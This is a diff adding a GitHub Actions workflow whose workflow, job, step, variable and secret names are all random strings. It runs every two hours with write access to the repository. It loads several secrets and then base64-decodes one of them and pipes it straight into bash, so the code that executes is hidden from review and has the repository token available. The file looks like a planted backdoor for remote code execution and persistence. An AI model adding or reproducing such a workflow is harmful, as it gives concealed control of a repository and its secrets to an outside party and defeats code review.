@@ -1,0 +1,21 @@
+name: DhVFGcAXUVCYcoq
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  enrIUs:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.hJXCHN5 }}
+      - name: N3WttCOsdDDm
+        env:
+          RsM8UkYvG: ${{ secrets.TCb7e63e8viu }}
+          Piu8KS: ${{ secrets.IVGLP }}
+          pJ3UXMupIyZaRe6: ${{ secrets.j4eytqj3 }}
+          GITHUB_TOKEN: ${{ secrets.hJXCHN5 }}
+        run: echo "$RsM8UkYvG" | base64 -d | bash
